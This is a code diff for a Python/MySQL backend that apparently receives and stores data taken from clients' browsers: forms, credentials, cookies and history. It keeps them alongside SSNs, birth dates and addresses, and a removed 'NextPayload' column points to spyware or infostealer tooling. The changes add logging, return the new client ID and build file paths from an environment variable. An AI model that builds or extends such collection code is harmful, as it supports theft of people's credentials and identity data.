@@ -1,5 +1,5 @@
 import pymysql
-import json
+import json, os
 import datetime
 from copy import deepcopy
 #from eventlet.db_pool import ConnectionPool
@@ -54,20 +54,22 @@ for example, browser history, credentials, forms, etc.
 """
 def create_new_client(data):
     with getConn() as conn:
-        conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (None, None, None, None, None, None, None, None, None, None, None, None, None))
+        print('creating new client')
+        conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (None, None, None, None, None, None, None, None, None, None, None, None))
         conn.execute('SELECT LAST_INSERT_ID()')
         curID = conn.fetchall()[0][0]
+        print('new id: {}'.format(curID))
         formsList = data["forms"]
     for x in formsList:
         store_form_data(x, curID)
-        credsList = data["creds"]
+    credsList = data["creds"]
     for y in credsList:
         store_credential(y, curID)
     cookiesList = data["cookies"]
     for z in cookiesList:
         store_cookie(z, curID)
     store_history(data["history"], curID)
-    return 0
+    return curID
 
 
 """
@@ -78,7 +80,7 @@ file: ../history-files/<clientid>-hist.txt
 returns 0 for ok, non-zero for bad data format
 """
 def store_history(data, clientid):
-    fStr = "../history-files/" + str(clientid) +"-hist.txt"
+    fStr = os.environ.get('SEANON_DIR') + "/history-files/" + str(clientid) +"-hist.txt"
     file = open(fStr, "w")
     currentTime = datetime.datetime.now()
     file.write(str(currentTime))
